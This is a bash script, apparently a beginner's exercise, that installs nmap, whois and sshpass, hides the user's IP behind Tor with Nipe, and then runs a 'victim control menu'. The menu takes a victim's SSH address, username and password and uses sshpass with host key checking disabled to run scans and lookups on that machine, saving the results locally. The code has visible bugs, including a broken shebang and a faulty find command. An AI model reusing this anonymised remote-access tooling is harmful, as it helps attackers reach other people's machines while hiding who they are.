#!/bi/bash

function APP_CHECK()
{
sudo updatedb
	for TOOL in geoiplookup nmap whois sshpass figlet cowsay
	do 
	CHECK=$(command -v $TOOL)
	if [ -z "$CHECK" ] #-z acts as zero 
	then
	echo 'The following tool is not instualled:' $TOOL
	echo "_______________________________________"
	echo 'Start the installation'
	echo "_______________________________________"
sudo apt-get install $TOOL &>/dev/null
	else 
	echo 'The following tool is instualled:' $TOOL
	fi
	done 

}
APP_CHECK
APP_CHECK


function NIPE_CHECK()
{
LOCATE_NIPE=sudo find/-name nipe.pl 2>devnull
	
	if [ -z "LOCATE_NIPE" ]
	then
	echo 'Nipe is not installed start installing'cd+
cd ; git clone https://github.com/htrgouvea/nipe && cd nipe &>/dev/null
sudo apt-get install cpanminus -y &>/dev/null
sudo cpanm --installdeps . &>/dev/null
sudo perl nipe.pl install &>/dev/null
	else
	echo 'NIPE IS ALREADY INSTALLED'
	fi
}
NIPE_CHECK


function ANONYMOUS_VERFY()
{
External_IP=$(curl -s ident.me)
COUNTRY=$(geoiplookup $External_IP | awk '{print $5}')
	
	if [ "$COUNTRY" == "Israel" ]
	then
	echo 'You are visibel'
	echo 'Activating Nipe'
NIPE_DIR=$(sudo find / -name nipe -type d 2>/dev/null)
cd $NIPE_DIR
sudo perl nipe.pl start
sudo perl nipe.pl restart
echo 'ANONYMOUS MOOD COMPLET'
echo 'THE ANONYMOUS IP:'
sudo perl nipe.pl status
	else
	echo
	echo '      ______YOU ARE ANONYMOUS______'
	echo "______________________________________________"
	echo
	echo 'WELCOME to:'$COUNTRY
	echo "______________________________________________"
	echo
	echo 'Your new IP is:'$External_IP
	fi
}
ANONYMOUS_VERFY


function CONTROL_VICTIM() 
{
    echo "______________________________________________"
    echo "    WELCOME TO VICTIM CONTROL MENU "
    echo "______________________________________________"
    echo "    plese enter the folowing data "
    echo "______________________________________________"
    sleep 1
    echo "1 - What is the IP Address of the ssh victim? "
    read V_IP
    sleep 1
    echo
    echo "2 - What is the Username of the ssh victim? "
    read V_USER
    sleep 1
    echo
    echo "3 - What is the Password of the ssh victim? "
    read V_PASS
    echo "The folowing information is"
    echo $V_IP
    echo $V_USER
    echo $V_PASS
    echo "Do you wish to continue?"
    echo 'press 1 for yes, 2 for No'
    read Choose
case $Choose in
1) echo 'Yes'
;;
2) echo 'No'
	clear
	sleep 2.0
	CONTROL_VICTIM
;;
*) echo 'Wrong answer'
	sleep 2.0
	clear
	CONTROL_VICTIM
;;
esac
    echo "______________________________________________"
   	echo 'Thank you for the information execution prosses started'
cd #navigate to the user home new folder.
mkdir Victim_Data
cd Victim_Data #move to the created new darctory 
sshpass -p $V_PASS ssh -o StrictHostKeyChecking=no $V_USER@$V_IP "whois espn.com" > whois_data.txt
sshpass -p $V_PASS ssh -o StrictHostKeyChecking=no $V_USER@$V_IP "nmap 8.8.8.8" > nmap_data.txt
sshpass -p $V_PASS ssh -o StrictHostKeyChecking=no $V_USER@$V_IP "echo 'The information of the victim are:'" > victim_data.txt
sshpass -p $V_PASS ssh -o StrictHostKeyChecking=no $V_USER@$V_IP "uptime ; curl -s ident.me" >> victim_data.txt
sshpass -p $V_PASS ssh -o StrictHostKeyChecking=no $V_USER@$V_IP "geoiplookup $(curl -s ident.me)" >> victim_data.txt	
	echo "_________________________________________________________________________"
	echo "Hi here i have created for you a new folder check it out Victim_Data, Heve a good 1."
} 
CONTROL_VICTIM
